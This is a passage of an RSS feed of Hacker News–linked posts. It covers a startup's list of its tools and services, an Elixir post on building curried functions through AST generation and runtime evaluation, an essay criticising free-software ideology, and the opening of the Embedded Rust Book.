    <p>service</p>
    <div>
      <h2>Github</h2>
      <p>Version control for 3 different Lunch Money repositories</p>
    </div>
    
     
    <!-- <span class="credit">Test</span> -->
  </a>
  
  <a href="https://circleci.com/" target="_blank">
    <p>service</p>
    <div>
      <h2>CircleCI</h2>
      <p>Continuous integration platform for automating building, testing and deployment</p>
    </div>
    
     
    <!-- <span class="credit">Test</span> -->
  </a>
  
  <a href="https://sentry.io/" target="_blank">
    <p>service</p>
    <div>
      <h2>Sentry</h2>
      <p>Application monitoring and error tracking</p>
    </div>
    
     <span>Open source</span>
    <!-- <span class="credit">Test</span> -->
  </a>
  
  <a href="https://logentries.com/" target="_blank">
    <p>service</p>
    <div>
      <h2>Logentries</h2>
      <p>Live server log management, installed and managed via Heroku</p>
    </div>
    
     
    <!-- <span class="credit">Test</span> -->
  </a>
  
  <a href="https://cloudflare.com/" target="_blank">
    <p>service</p>
    <div>
      <h2>Cloudflare</h2>
      <p>A robust CDN to protect against security threats</p>
    </div>
    
     
    <!-- <span class="credit">Test</span> -->
  </a>
  
  <a href="https://stripe.com/" target="_blank">
    <p>service</p>
    <div>
      <h2>Stripe</h2>
      <p>Handler for all payments and subscriptions</p>
    </div>
    
     
    <!-- <span class="credit">Test</span> -->
  </a>
  
  <a href="https://emailoctopus.com/?urli=msfLh" target="_blank">
    <p>service</p>
    <div>
      <h2>EmailOctopus</h2>
      <p>Managing and sending campaigns for email marketing</p>
    </div>
    
    <span>Bootstrapped</span> 
    <!-- <span class="credit">Test</span> -->
  </a>
  
  <a href="https://taskforce.sh/" target="_blank">
    <p>service</p>
    <div>
      <h2>Taskforce</h2>
      <p>A useful visual tool for monitoring redis queues</p>
    </div>
    
     
    <!-- <span class="credit">Test</span> -->
  </a>
  
  <a href="https://domains.google/" target="_blank">
    <p>service</p>
    <div>
      <h2>Google Domains</h2>
      <p>For registrating and managing all the domains!</p>
    </div>
    
     
    <!-- <span class="credit">Test</span> -->
  </a>
  
  <a href="https://atom.io/" target="_blank">
    <p>app</p>
    <div>
      <h2>Atom</h2>
      <p>Code editor of choice (with a light theme, too!)</p>
    </div>
    
     <span>Open source</span>
    <!-- <span class="credit">Test</span> -->
  </a>
  
  <a href="https://eggerapps.at/postico/" target="_blank">
    <p>app</p>
    <div>
      <h2>Postico</h2>
      <p>A GUI for navigating the PostgreSQL database</p>
    </div>
    
    <span>Bootstrapped</span> 
    <!-- <span class="credit">Test</span> -->
  </a>
  
  <a href="https://postman.com/" target="_blank">
    <p>app</p>
    <div>
      <h2>Postman</h2>
      <p>Quickly make HTTP requests and test APIs</p>
    </div>
    
     
    <!-- <span class="credit">Test</span> -->
  </a>
  
  <a href="https://www.loom.com/" target="_blank">
    <p>app</p>
    <div>
      <h2>Loom</h2>
      <p>Used for recording walkthrough videos</p>
    </div>
    
     
    <!-- <span class="credit">Test</span> -->
  </a>
  
  <a href="https://slack.com/" target="_blank">
    <p>app</p>
    <div>
      <h2>Slack</h2>
      <p>Powers the Lunch Money Slack community and also used as an alerting system for various parts of the app</p>
    </div>
    
     
    <!-- <span class="credit">Test</span> -->
  </a>
  
  <a href="https://imageoptim.com/mac" target="_blank">
    <p>app</p>
    <div>
      <h2>ImageOptim</h2>
      <p>A great tool for optimizing images for the web</p>
    </div>
    
     <span>Open source</span>
    <!-- <span class="credit">Test</span> -->
  </a>
  
  <a href="https://apps.apple.com/us/app/copyclip-clipboard-history/id595191960?mt=12" target="_blank">
    <p>app</p>
    <div>
      <h2>CopyClip</h2>
      <p>Free clipboard manager that saves your last X copied items</p>
    </div>
    
    <span>Bootstrapped</span> 
    <!-- <span class="credit">Test</span> -->
  </a>
  
  <a href="https://react.semantic-ui.com/" target="_blank">
    <p>design</p>
    <div>
      <h2>Semantic UI</h2>
      <p>UI component framework that, combined with my own custom CSS, power 80% of the visuals for Lunch Money</p>
    </div>
    
     <span>Open source</span>
    <!-- <span class="credit">Test</span> -->
  </a>
  
  <a href="https://www.chartjs.org/" target="_blank">
    <p>design</p>
    <div>
      <h2>Chart.js</h2>
      <p>Simple yet flexible JavaScript charting library</p>
    </div>
    
     <span>Open source</span>
    <!-- <span class="credit">Test</span> -->
  </a>
  
  <a href="https://www.sketch.com/" target="_blank">
    <p>design</p>
    <div>
      <h2>Sketch</h2>
      <p>Used for all my illustrations, designs and mock-ups</p>
    </div>
    
     
    <!-- <span class="credit">Test</span> -->
  </a>
  
  <a href="https://colorslurp.com/" target="_blank">
    <p>design</p>
    <div>
      <h2>ColorSlurp</h2>
      <p>A great, simple tool for grabbing hex codes for any pixel on my screen</p>
    </div>
    
    <span>Bootstrapped</span> 
    <!-- <span class="credit">Test</span> -->
  </a>
  
  <a href="https://www.getcloudapp.com/" target="_blank">
    <p>design</p>
    <div>
      <h2>CloudApp</h2>
      <p>Used to record GIFs for use in emails or marketing site</p>
    </div>
    
     
    <!-- <span class="credit">Test</span> -->
  </a>
  
  <a href="https://www.stockio.com/free-icons/" target="_blank">
    <p>design</p>
    <div>
      <h2>Stockio</h2>
      <p>A great resource for free SVGs and inspiration</p>
    </div>
    
     
    <!-- <span class="credit">Test</span> -->
  </a>
  
  <a href="https://noteplan.co/" target="_blank">
    <p>productivity</p>
    <div>
      <h2>Noteplan 3</h2>
      <p>Calendar-driven note taking and task tracking. Fits perfectly with how my brain works!</p>
    </div>
    
    <span>Bootstrapped</span> 
    <!-- <span class="credit">Test</span> -->
  </a>
  
  <a href="https://dailytimetracking.com/" target="_blank">
    <p>productivity</p>
    <div>
      <h2>Daily</h2>
      <p>Insightful time tracking app that asks you every few minutes what you're working on</p>
    </div>
    
    <span>Bootstrapped</span> 
    <!-- <span class="credit">Test</span> -->
  </a>
  
  <a href="https://www.getharvest.com/" target="_blank">
    <p>productivity</p>
    <div>
      <h2>Harvest</h2>
      <p>General time tracking app so I know how many hours per day I'm working</p>
    </div>
    
    <span>Bootstrapped</span> 
    <!-- <span class="credit">Test</span> -->
  </a>
  
  <a href="https://1password.com/" target="_blank">
    <p>productivity</p>
    <div>
      <h2>1Password</h2>
      <p>An undeniably essential password management tool</p>
    </div>
    
     
    <!-- <span class="credit">Test</span> -->
  </a>
  
  <a href="https://docs.google.com/" target="_blank">
    <p>productivity</p>
    <div>
      <h2>Google Docs/Sheets</h2>
      <p>Web-based office suite for notes and spreadsheets</p>
    </div>
    
     
    <!-- <span class="credit">Test</span> -->
  </a>
  
  <a href="https://clickup.com/?fp_ref=jennifer25" target="_blank">
    <p>productivity</p>
    <div>
      <h2>ClickUp</h2>
      <p>Customizable task management tool to keep track of all the feature requests!</p>
    </div>
    
     
    <!-- <span class="credit">Test</span> -->
  </a>
  
  <a href="https://gmail.com/" target="_blank">
    <p>productivity</p>
    <div>
      <h2>Gmail</h2>
      <p>Where all communication and customer support is centralized</p>
    </div>
    
     
    <!-- <span class="credit">Test</span> -->
  </a>
  
  <a href="https://streak.com/r/q49i4je4f94f3b" target="_blank">
    <p>productivity</p>
    <div>
      <h2>Streak</h2>
      <p>Gmail plug-in for email tracking and mail merging</p>
    </div>
    
     
    <!-- <span class="credit">Test</span> -->
  </a>
  
  <a href="https://forestry.io/" target="_blank">
    <p>productivity</p>
    <div>
      <h2>Forestry</h2>
      <p>Headless CMS that powers the founder's personal blog</p>
    </div>
    
     
    <!-- <span class="credit">Test</span> -->
  </a>
  
  <a href="https://transferwise.com/" target="_blank">
    <p>business</p>
    <div>
      <h2>Transferwise</h2>
      <p>Used to accept payments and store money in all different currencies</p>
    </div>
    
     
    <!-- <span class="credit">Test</span> -->
  </a>
  
  <a href="https://forms.google.com/" target="_blank">
    <p>business</p>
    <div>
      <h2>Google Forms</h2>
      <p>For quick and simple surveys</p>
    </div>
    
     
    <!-- <span class="credit">Test</span> -->
  </a>
  
  <a href="https://secure.emailmeter.com/ref/afb4870c" target="_blank">
    <p>business</p>
    <div>
      <h2>Email Meter</h2>
      <p>Insightful analytics into my email usage</p>
    </div>
    
    <span>Bootstrapped</span> 
    <!-- <span class="credit">Test</span> -->
  </a>
  
  <a href="https://www.profitkit.io/referral-link/83486dc7a899bacdc909bd8ab8f65380c7666dee0ddad0f5e85a82fe329214e5" target="_blank">
    <p>business</p>
    <div>
      <h2>ProfitKit</h2>
      <p>A great tool for Stripe subscription analytics</p>
    </div>
    
    <span>Bootstrapped</span> 
    <!-- <span class="credit">Test</span> -->
  </a>
  
  <a href="https://analytics.google.com/" target="_blank">
    <p>business</p>
    <div>
      <h2>Google Analytics</h2>
      <p>For insights on how marketing campaigns are doing and how users are discovering Lunch Money</p>
    </div>
    
     
    <!-- <span class="credit">Test</span> -->
  </a>
  
  <a href="https://ahrefs.com/" target="_blank">
    <p>business</p>
    <div>
      <h2>Ahrefs</h2>
      <p>SEO performance and monitoring for Lunch Money</p>
    </div>
    
    <span>Bootstrapped</span> 
    <!-- <span class="credit">Test</span> -->
  </a>
  
  <a href="https://canny.io/" target="_blank">
    <p>business</p>
    <div>
      <h2>Canny</h2>
      <p>Customer feedback management tool</p>
    </div>
    
    <span>Bootstrapped</span> 
    <!-- <span class="credit">Test</span> -->
  </a>
  
  <a href="https://support.apple.com/kb/SP794" target="_blank">
    <p>hardware</p>
    <div>
      <h2>Apple Macbook Pro 15"</h2>
      <p>2019 model in space gray donned with a Lunch Money sticker over the Apple logo</p>
    </div>
    
     
    <!-- <span class="credit">Test</span> -->
  </a>
  
  <a href="http://www.nexstand.com/" target="_blank">
    <p>hardware</p>
    <div>
      <h2>Nexstand Laptop Stand</h2>
      <p>Portable and ergonomic solution for propping up my laptop</p>
    </div>
    
     
    <!-- <span class="credit">Test</span> -->
  </a>
  
  <a href="https://shop.goldtouch.com/products/goldtouch-go2-wireless-bluetooth-mobile-keyboard-pc-mac" target="_blank">
    <p>hardware</p>
    <div>
      <h2>Goldtouch Bluetooth Foldable Keyboard</h2>
      <p>Absolutely love this keyboard for portability and utility</p>
    </div>
    
     
    <!-- <span class="credit">Test</span> -->
  </a>
  
  <a href="https://www.asus.com/Displays-Desktops/Monitors/All-series/VZ249H/" target="_blank">
    <p>hardware</p>
    <div>
      <h2>Asus 24" Monitor</h2>
      <p>Wish I went 4K but this does the trick!</p>
    </div>
    
     
    <!-- <span class="credit">Test</span> -->
  </a>
  
  <a href="https://www.avermedia.com/us/product-detail/AM310" target="_blank">
    <p>hardware</p>
    <div>
      <h2>AverMedia Microphone</h2>
      <p>Affordable USB microphone for superior sound quality when recording videos or podcasts</p>
    </div>
    
     
    <!-- <span class="credit">Test</span> -->
  </a>
  
  <a href="https://ismbags.com/" target="_blank">
    <p>hardware</p>
    <div>
      <h2>ISM Bag</h2>
      <p>Stylish and functional backpack to store all my essentials  when I'm on the go</p>
    </div>
    
    <span>Bootstrapped</span> 
    <!-- <span class="credit">Test</span> -->
  </a>
  
  <a href="http://minesweeperonline.com/#150" target="_blank">
    <p>fun</p>
    <div>
      <h2>Minesweeper</h2>
      <p>Warm up (or distraction) for my brain. Get 3 months free of Lunch Money if you can beat my high score‚Äì 76s on expert!</p>
    </div>
    
     
    <!-- <span class="credit">Test</span> -->
  </a>
  
</div></div>]]>
            </description>
            <link>https://lunchmoney.app/stack</link>
            <guid isPermaLink="false">hacker-news-small-sites-26124455</guid>
            <pubDate>Sat, 13 Feb 2021 16:19:57 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Cursed Curried Elixir]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26124431">thread link</a>) | @evuez
<br/>
February 13, 2021 | https://liftm.io/posts/cursed-curried-elixir.html | <a href="https://web.archive.org/web/*/https://liftm.io/posts/cursed-curried-elixir.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
      
        <time datetime="2021-02-13">2021-02-13</time>
      <p>In <a href="https://liftm.io/posts/curried-elixir.html">Curried Elixir</a>, I said this:</p>
<blockquote>
<p>We're going to do this by wrapping <code>my_fun</code> in a chain of anonymous functions, each binding exactly one name:</p>
<pre><code>curried_fun =
  fn (a) -&gt;
    fn (b) -&gt;
      fn (c) -&gt;
        my_fun.(a, b, c)
      end
    end
  end
</code></pre>
</blockquote>
<p>And then went on implementing <code>curry</code> as a recursive function. But what if I actually want my curried function to be a chain of anonymous functions, and get rid of this recursive call?</p>
<p>The obvious thing to do would be to try to implement this as a macro instead. But I think we can do better than this.</p>
<p>First, let's look at the <a href="https://hexdocs.pm/elixir/syntax-reference.html#the-elixir-ast">AST</a> for the <code>curried_fun</code> above:</p>
<pre><code>iex&gt; quote do
...&gt;   fn (a) -&gt;
...&gt;     fn (b) -&gt;
...&gt;       fn (c) -&gt;
...&gt;         my_fun.(a, b, c)
...&gt;       end
...&gt;     end
...&gt;   end
...&gt; end
#                ‚ñº metadata                ‚ñº nested anonymous function
{:fn, [], [{:-&gt;, [], [[{:a, [], Elixir}], {:fn, [], [{:-&gt;, ...}]}]}]}
#                      ‚ñ≤ list of parameters
</code></pre>
<p>This might look a bit messy, but there really isn't much going on:</p>
<pre><code>{:fn, [], # The definition with an empty list of metadata
 [
   {:-&gt;, [],
    [
      [{:a, [], Elixir}], # Left-hand side of `-&gt;`, the head of the anonymous function
      {:fn , [], # Right-hand side of `-&gt;`, the body of the anonymous function
       ...
</code></pre>
<h2>Building the AST</h2>
<p>Just to get started, let's see if we can write a function that generates this AST for us.
We want this function to take as arguments the length of the chain and the body of the innermost function in the chain:</p>
<pre><code>def make_chain(length_, body) do
  Enum.reduce(1..length_, body, fn x, acc -&gt;
    {:fn, [], [{:-&gt;, [], [[{:"arg#{x}", [], nil}], acc]}]}
  end)
end
</code></pre>
<p>Or better, use <a href="https://hexdocs.pm/elixir/Macro.html#generate_unique_arguments/2"><code>Macro.generate_unique_arguments/2</code></a> to generate the list of parameters for us:</p>
<pre><code>defmodule Func do
  def make_chain(length_, body) do
    length_
    |&gt; Macro.generate_unique_arguments(nil)
    |&gt; Enum.reverse() # Without this, the outermost function would get the last argument, which could make things confusing
    |&gt; Enum.reduce(body, fn arg, acc -&gt;
      {:fn, [], [{:-&gt;, [], [[arg], acc]}]}
    end)
  end
end
</code></pre>
<p>We can use <a href="https://hexdocs.pm/elixir/Macro.html#to_string/2"><code>Macro.to_string/1</code></a> to check if this works as expected:</p>
<pre><code>iex&gt; Macro.to_string(make_chain(2, "Foo"))
"fn arg1 -&gt; fn arg2 -&gt; \"Foo\" end end"
</code></pre>
<p>Perfect! üéâ</p>
<p>We have one thing left to do before we can start rewriting <code>curry</code>: we need to generate the AST to call <code>fun</code>. This is actually pretty easy:</p>
<pre><code>iex&gt; quote do: fun.(a, b)
{{:., [], [{:fun, [], Elixir}]}, [], [{:a, [], Elixir}, {:b, [], Elixir}]}
</code></pre>
<p>All we need is <a href="https://hexdocs.pm/elixir/Macro.html#generate_unique_arguments/2"><code>Macro.generate_unique_arguments/2</code></a> and <a href="https://hexdocs.pm/elixir/master/Function.html#info/2"><code>Function.info/2</code></a> to get the arity of <code>fun</code>:</p>
<pre><code>iex&gt; fun = &amp;Map.get/2
iex&gt; {:arity, arity} = Function.info(fun, :arity)
iex&gt; params = Macro.generate_unique_arguments(arity, nil)
iex&gt; Macro.to_string({{:., [], [{:fun, [], nil}]}, [], params})
"fun.(arg1, arg2)"
</code></pre>
<h2>Evaluating the AST</h2>
<p>We now know how to generate the AST for our curried function. For the next step, we need to figure out how to use it!</p>
<p>If you're scared of <a href="https://hexdocs.pm/elixir/Kernel.html#defmacro/2"><code>defmacro/2</code></a> and <a href="https://hexdocs.pm/elixir/Kernel.SpecialForms.html#unquote/1"><code>unquote/1</code></a>, don't worry. We don't need any of that. Everyone knows macros are scary.</p>
<p>You know what's not scary? <em>Runtime evaluation!</em></p>
<p>With <a href="https://hexdocs.pm/elixir/Code.html#eval_quoted/3"><code>Code.eval_quoted/2</code></a>, we should finally be able to write our <code>curry</code> function:</p>
<pre><code>defmodule Func do
  def curry(fun) do
    {:arity, arity} = Function.info(fun, :arity)
    params = Macro.generate_unique_arguments(arity, nil)
    body_ast = {{:., [], [{:fun, [], nil}]}, [], params}

    {curried_fun, _} =
      params
      |&gt; Enum.reverse()
      |&gt; Enum.reduce(body_ast, fn arg, acc -&gt;
        {:fn, [], [{:-&gt;, [], [[arg], acc]}]}
      end)
      |&gt; Code.eval_quoted(fun: fun)

    curried_fun
  end
end
</code></pre>
<p>Does it work?</p>
<pre><code>iex&gt; curried_sum = Func.curry(fn x, y -&gt; x + y end)
#Function&lt;...&gt;
iex&gt; curried_sum.(1).(2)
3
iex&gt; Func.curry(&amp;Map.get/2).(%{foo: "bar"}).(:foo)
"bar"
</code></pre>
<p>It does! üéâ
Who needs macros??</p>

    </article></div>]]>
            </description>
            <link>https://liftm.io/posts/cursed-curried-elixir.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26124431</guid>
            <pubDate>Sat, 13 Feb 2021 16:16:21 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Original Sin of Free Software (2019)]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26124403">thread link</a>) | @asymmetric
<br/>
February 13, 2021 | https://lipu.dgold.eu/original-sin.html | <a href="https://web.archive.org/web/*/https://lipu.dgold.eu/original-sin.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    

    <p>Someone asked me about this very recently so I felt it
    was worth writing out my thoughts in more detail. Note that
    this isn‚Äôt a manifesto, or a declaration, its just an
    effort to start putting some structure on my thoughts.</p>

    <h2 id="thehistory">The History</h2>

    <p>Since Richard Stallman wrote his GNU Manifesto<a href="#fn:1" id="fnref:1" title="see footnote" name="fnref:1">[1]</a> in the mid‚Äì1980s, it has come to
    be regarded as the ur-text of Free and Open Software. The
    principles enunciated were later expanded upon and codified in
    the Free Software Definition<a href="#fn:2" id="fnref:2" title="see footnote" name="fnref:2">[2]</a>, and
    have been adopted, to varying degrees, by different
    organisations, like Debian‚Äôs Free Software
    Guidelines<a href="#fn:3" id="fnref:3" title="see footnote" name="fnref:3">[3]</a> and the OSI‚Äôs
    Open Source Definition<a href="#fn:4" id="fnref:4" title="see footnote" name="fnref:4">[4]</a>. Before
    I continue, its probably a good idea to restate the ‚ÄúFour
    Freedoms‚Äù of the FSD:-</p>

    <ol>
      <li>The freedom to run the program as you wish, for any
      purpose</li>

      <li>The freedom to study how the program works, and change it
      so it does your computing as you wish. Access to the source
      code is a precondition for this.</li>

      <li>The freedom to redistribute copies so you can help your
      neighbor.</li>

      <li>The freedom to distribute copies of your modified
      versions to others. By doing this you can give the whole
      community a chance to benefit from your changes. Access to
      the source code is a precondition for this.</li>
    </ol>

    <p>While these are each expressed as <em>positive</em>
    freedoms, when the Four Freedoms (I‚Äôll refer to these as
    4F from here, and call the individual Freedoms by number, e.g.
    4F0) were adopted by Debian and OSI, there was a distinct shift
    from positive freedoms to <em>restrictive</em> freedoms - most
    particularly the requirements that the software license:-</p>

    <dl>
      <dt><em>No Discrimination Against Fields of
      Endeavor</em></dt>

      <dd>The license must not restrict anyone from making use of
      the program in a specific field of endeavor. For example, it
      may not restrict the program from being used in a business,
      or from being used for genetic research.</dd>

      <dt><em>Distribution of License</em></dt>

      <dd>The rights attached to the program must apply to all to
      whom the program is redistributed without the need for
      execution of an additional license by those parties.</dd>
    </dl>

    <h2 id="theoriginalsins">The Original Sins</h2>

    <p>There are two separate, albeit related, problems which
    underlie these apparently positive definitions: Individualism
    &amp; Capitalism.</p>

    <p>In each case, be it the 4F, DSG or the OSI, all positive
    rights are expressed purely in <em>individual</em> terms. There
    are no collective rights in these documents, just individual
    rights. The ideal of the developer as an individual is
    hard-coded into the DNA of the Free Software Movement and its
    various children.</p>

    <p>There are various reasons for this; Stallman‚Äôs
    original tracts, for example, idealise his struggles with the
    collapse of the ‚Äúsocial club‚Äù of MIT‚Äôs AI Lab
    and emphasise his private struggles against the loss of his
    community, these experiences are the cornerstone of his
    personal identity. Bruce Perens, father of the Debian Project,
    holds to the peculiar American cult of the Individualist
    Libertarian, as does Eric Raymond, the programmer/chronicler
    who devised the Open Source concept with Perens in the late
    1990s - free software without the freedom.</p>

    <p>It is important to remember that the American version of
    Libertarianism, as espoused by Ayn Rand and her ideologues, is
    nothing to do with the Franco-European tradition of
    libertarianism, a spectrum of leftist anarchism running from
    Babeuf through D√©jacque to Faure. American
    Libertarianism should more accurately be described as
    ‚Äúanarchist-capitalism‚Äù, a strain of
    pseudo-political thought which idolises the popular concept of
    the Old West as a high-point of western civilisation, when men
    were men and justice as dispensed from the barrel of a gun.</p>

    <p>It is notable that the sole non-individual right enunciated
    in the DSG and the OSD is that of the
    <strong>corporation</strong>. Perens and Raymond were certainly
    motivated by the tenets of capitalism, the primary purpose of
    their ‚ÄúOpen Source Definition‚Äù was the packaging up
    of ‚ÄúFree Software‚Äù to make it acceptable to
    capitalists and rent-seekers of every stripe. Their
    collaborators in this, most notably Brian Behlensdorf and Larry
    Augustin, later seamlessly transitioned to the burgeoning
    Venture Capitalist industry.</p>

    <p>Be it as a result of accident, as with Stallman, or of
    design, as with Perens/Raymond <em>et al</em>, these designers
    of the ‚ÄúHoly Texts‚Äù of Free and Open Software
    applied no value to the concepts of Community and Commons.</p>

    <p>To look again at 4F3 &amp; 4F4, the Freedoms described are
    explicitly the Freedom for the Individual Programmer to decide
    whether to share his value-added programs with his community.
    More than that, in his detailed expansion on the Freedoms,
    Stallman is at pains to explain that his Freedoms do not
    enforce any <em>obligation</em> upon the Individual Programmer
    to release <em>his</em> works. In fact, in his expanded notes,
    Stallman entitles 4F3 <em>‚ÄúThe freedom to redistribute,
    <strong>if you wish</strong>‚Äù</em>:-</p>

    <blockquote>
      <p>You should also have the freedom to make modifications and use them
privately in your own work or play, without even mentioning that they exist. If
you do publish your changes, you should not be required to notify anyone in
particular, or in any particular way.</p>
    </blockquote>

    <p>Again, the entire emphasis of Stallman‚Äôs concept of
    Freedom rests on the specific rights of the Individual.
    Stallman, moreover, is the ‚Äúhardcore‚Äù of this
    movement, the supposedly non-commercial member of the group.
    The emphasis placed here on the right to not distribute if you
    wish may seem trivial, however, it is central to the overall
    failure of Free and Open Source Software.</p>

    <h2 id="theresultingproblems">The Resulting Problems</h2>

    <p>Today, some 35 years after Stallman‚Äôs 4Fs, we can see
    that Free and Open Source Software is, in almost all
    conceivable ways, triumphant. It has won its struggles against
    Microsoft, it is the core of almost all smartphones, it lies at
    the heart of the networked world we all inhabit.</p>

    <p>Amidst all this glory, however, there is something utterly
    broken about the FOSS world. In short, it is one-sided, devoid
    of economic rights, and an active agent in the oppression of us
    all.</p>

    <p>As a result of the underlying assumptions and conceptions of
    the FOSS movement, there is no methodology to <em>require</em>
    the sharing of changes and improvments with the commons. The
    entire focus of the FOSS movement is specifically geared
    towards individual rights, the focus of the Open-Source
    movement is on ensuring that coporations can freely take the
    product of individual labour and profit from it.</p>

    <p>Because of Stallman‚Äôs original sin, there is no
    accepted structure within the FOSS world wherein such
    obligation to share changes can be enforced by the originator
    of a piece of software. The DSG, in fact, specifically requires
    this as a <em>precondition</em> for inclusion in its
    repositories.</p>

    <p>This means that improvements in software, bug-fixes,
    security-patches and the like, remain the absolute property of
    the person who has made them, despite the fact that they are,
    in Newton‚Äôs words, <em>‚Äústanding on the
    shoulders‚Äù</em> of those who came before. The originator
    of the software, in other words, is someone who can count
    herself lucky to be afforded the ‚Äúexposure‚Äù which
    may come from the future sale of her works by a more powerful
    entity. The entire function of FOSS is for developers to
    provide the fruits of their labour, either without recompense
    or for fractional recompense, to others.</p>

    <p>The individual programmer has the rights afforded them by
    the 4Fs and the OSD, but those rights are inherently solitary.
    What possibility can there be to enforce those rights, limited
    as they may be, against the powerhouses of our gilded age? What
    economic rights accrue to our developers, the people who, in
    Stallman‚Äôs conception, are the origin point of the FOSS
    movement?</p>

    <p>Two recent and pertinent examples can be examined to provide
    answers: Heartbleed, the security vulnerability in the OpenSSL
    Library; and GitHub.</p>

    <p>OpenSSL, a software library used to secure communications
    against eavesdropping, was (until Heartbleed) primarily written
    by one person, Stephen Henson. The OpenSSL Foundation, who
    employed him, had never had more than $1m in annual funding,
    and this funding was obtained almost exclusively through
    third-party contract work which focused on specific deliverable
    product, <strong>not</strong> on the <em>‚Äúfundamental
    maintenance and development activities like releases
    management, code review and refactoring, performance and
    security, etc.‚Äù</em><a href="#fn:5" id="fnref:5" title="see footnote" name="fnref:5">[5]</a> The
    beneficiaries of OpenSSL‚Äôs public nature had donated, on
    average, some <strong>$2,000</strong> a year for this critical
    piece of software.<a href="#fn:6" id="fnref:6" title="see footnote" name="fnref:6">[6]</a></p>

    <p>The Heartbleed, vulnerability, when it became known, was a
    disaster of almost unimaginable proportions. Entire sectors of
    the internet were vulnerable to this exploit thanks to their
    reliance on this crucial underfunded piece of software.
    Companies like Amazon Web Services (annual sales, $5.11bn),
    Stripe (market valuation, $245bn) and Cisco Systems (annual
    income, $50bn) were exposed.</p>

    <p>That‚Äôs not just standing on the shoulders,
    that‚Äôs standing on the shoulders while the owner of the
    shoulders is five feet under water. To a great extent, the
    people who write FOSS software don‚Äôt even see this as a
    problem, they‚Äôre happy to have someone shoving them under
    the water.</p>

    <p>Take, as a different example, GitHub - the repository of
    much of the FOSS world‚Äôs source code. Its entire business
    model is predicated on the willingness of creators to share the
    product of their ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://lipu.dgold.eu/original-sin.html">https://lipu.dgold.eu/original-sin.html</a></em></p>]]>
            </description>
            <link>https://lipu.dgold.eu/original-sin.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26124403</guid>
            <pubDate>Sat, 13 Feb 2021 16:11:58 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Embedded Rust Book]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26124375">thread link</a>) | @lnyan
<br/>
February 13, 2021 | https://rust-embedded.github.io/book/ | <a href="https://web.archive.org/web/*/https://rust-embedded.github.io/book/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">
        <!-- Provide site root to javascript -->
        

        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        

        <!-- Set the theme before any content is loaded, prevents flash -->
        

        <!-- Hide / unhide sidebar before it is displayed -->
        

        <nav id="sidebar" aria-label="Table of contents">
            
            
        </nav>

        <div id="page-wrapper">

            <div class="page">
                
                
                

                
                
                

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                

                <div id="content">
                    <main>
                        
<p>Welcome to The Embedded Rust Book: An introductory book about using the Rust
Programming Language on "Bare Metal" embedded systems, such as Microcontrollers.</p>
<h2><a href="#who-embedded-rust-is-for" id="who-embedded-rust-is-for">Who Embedded Rust is For</a></h2>
<p>Embedded Rust is for everyone who wants to do embedded programming while taking advantage of the higher-level concepts and safety guarantees the Rust language provides.
(See also <a href="https://doc.rust-lang.org/book/ch00-00-introduction.html">Who Rust Is For</a>)</p>
<h2><a href="#scope" id="scope">Scope</a></h2>
<p>The goals of this book are:</p>
<ul>
<li>
<p>Get developers up to speed with embedded Rust development. i.e. How to set
up a development environment.</p>
</li>
<li>
<p>Share <em>current</em> best practices about using Rust for embedded development. i.e.
How to best use Rust language features to write more correct embedded
software.</p>
</li>
<li>
<p>Serve as a cookbook in some cases. e.g. How do I do mix C and Rust in a single
project?</p>
</li>
</ul>
<p>This book tries to be as general as possible but to make things easier for both
the readers and the writers it uses the ARM Cortex-M architecture in all its
examples. However, the book doesn't assume that the reader is familiar with this
particular architecture and explains details particular to this architecture
where required.</p>
<h2><a href="#who-this-book-is-for" id="who-this-book-is-for">Who This Book is For</a></h2>
<p>This book caters towards people with either some embedded background or some Rust background, however we believe
everybody curious about embedded Rust programming can get something out of this book. For those without any prior knowledge
we suggest you read the "Assumptions and Prerequisites" section and catch up on missing knowledge to get more out of the book
and improve your reading experience. You can check out the "Other Resources" section to find resources on topics
you might want to catch up on.</p>
<h3><a href="#assumptions-and-prerequisites" id="assumptions-and-prerequisites">Assumptions and Prerequisites</a></h3>
<ul>
<li>You are comfortable using the Rust Programming Language, and have written,
run, and debugged Rust applications on a desktop environment. You should also
be familiar with the idioms of the <a href="https://doc.rust-lang.org/edition-guide/">2018 edition</a> as this book targets
Rust 2018.</li>
</ul>
<ul>
<li>You are comfortable developing and debugging embedded systems in another
language such as C, C++, or Ada, and are familiar with concepts such as:
<ul>
<li>Cross Compilation</li>
<li>Memory Mapped Peripherals</li>
<li>Interrupts</li>
<li>Common interfaces such as I2C, SPI, Serial, etc.</li>
</ul>
</li>
</ul>
<h3><a href="#other-resources" id="other-resources">Other Resources</a></h3>
<p>If you are unfamiliar with anything mentioned above or if you want more information about a specific topic mentioned in this book you might find some of these resources helpful.</p>
<table><thead><tr><th>Topic</th><th>Resource</th><th>Description</th></tr></thead><tbody>
<tr><td>Rust</td><td><a href="https://doc.rust-lang.org/book/">Rust Book</a></td><td>If you are not yet comfortable with Rust, we highly suggest reading this book.</td></tr>
<tr><td>Rust, Embedded</td><td><a href="https://docs.rust-embedded.org/discovery/">Discovery Book</a></td><td>If you have never done any embedded programming, this book might be a better start</td></tr>
<tr><td>Rust, Embedded</td><td><a href="https://docs.rust-embedded.org/">Embedded Rust Bookshelf</a></td><td>Here you can find several other resources provided by Rust's Embedded Working Group.</td></tr>
<tr><td>Rust, Embedded</td><td><a href="https://docs.rust-embedded.org/embedonomicon/">Embedonomicon</a></td><td>The nitty gritty details when doing embedded programming in Rust.</td></tr>
